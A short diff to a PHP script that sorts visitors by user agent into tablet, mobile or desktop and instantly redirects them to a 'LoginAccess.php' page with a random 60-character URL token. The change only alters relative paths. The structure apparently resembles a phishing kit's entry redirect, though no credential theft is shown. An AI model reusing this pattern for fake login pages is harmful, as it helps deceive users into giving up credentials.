@@ -13,8 +13,9 @@ if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}
 if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;
 $stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
 if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}
-if ($tablet_browser > 0) {?><meta http-equiv="Refresh" content="0; url=LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}else if ($mobile_browser > 0) {?><meta http-equiv="Refresh" content="0; url=mobile/LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
-else {?><meta http-equiv="Refresh" content="0; url=LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
+if ($tablet_browser > 0) {?><meta http-equiv="Refresh" content="0; url=../LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
+else if ($mobile_browser > 0) {?><meta http-equiv="Refresh" content="0; url=LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
+else {?><meta http-equiv="Refresh" content="0; url=../LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
 /// End
 
 
